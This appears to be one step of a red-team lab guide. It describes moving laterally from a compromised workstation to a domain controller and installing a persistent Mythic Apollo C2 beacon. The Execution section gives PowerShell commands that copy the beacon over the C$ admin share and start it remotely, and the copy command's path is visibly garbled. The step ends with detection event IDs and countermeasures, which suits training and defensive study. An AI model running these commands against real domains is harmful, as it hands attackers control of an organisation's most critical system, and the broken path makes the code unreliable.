
# Step 2: Pivot to Domain Controller

**Objective**: Establish a second, persistent Mythic beacon directly on the Domain Controller (`infra-dc1`) using your existing foothold on `it-workstation02`.

---

## Context

- Red Team has an active Apollo beacon on `it-workstation02` with domain admin rights.
- Goal is to gain direct control over the Domain Controller for high-trust actions in later steps.

---

## Execution

### 1. Deploy Apollo Beacon to `infra-dc1`

From the beacon on `it-workstation02`, execute the following:

```powershell
Copy-Item -Path C:\RedTeam\apollo.exe -Destination \infra-dc1\C$\Windows\Temppollo.exe
Invoke-Command -ComputerName infra-dc1 -ScriptBlock { Start-Process "C:\Windows\Temp\apollo.exe" }
```

### 2. Confirm Callback in Mythic

- In the Mythic UI, look for a new callback from `infra-dc1`
- Verify integrity level and user context

---

## Result

- Live beacon is now active on the Domain Controller (`infra-dc1`)
- You have privileged, persistent access to the environment's most critical system

---

## Detection Opportunities

| Event ID | Description |
|----------|-------------|
| 4624     | Remote logon (via WinRM or SMB) |
| 7045     | New service creation if applicable |
| PowerShell logs | Remote execution / file copy |

---

## Defensive Countermeasures

- Alert on lateral movement to DCs from workstations
- Restrict admin shares and WinRM access to DCs
- Monitor for unauthorized process execution in `C:\Windows\Temp\`
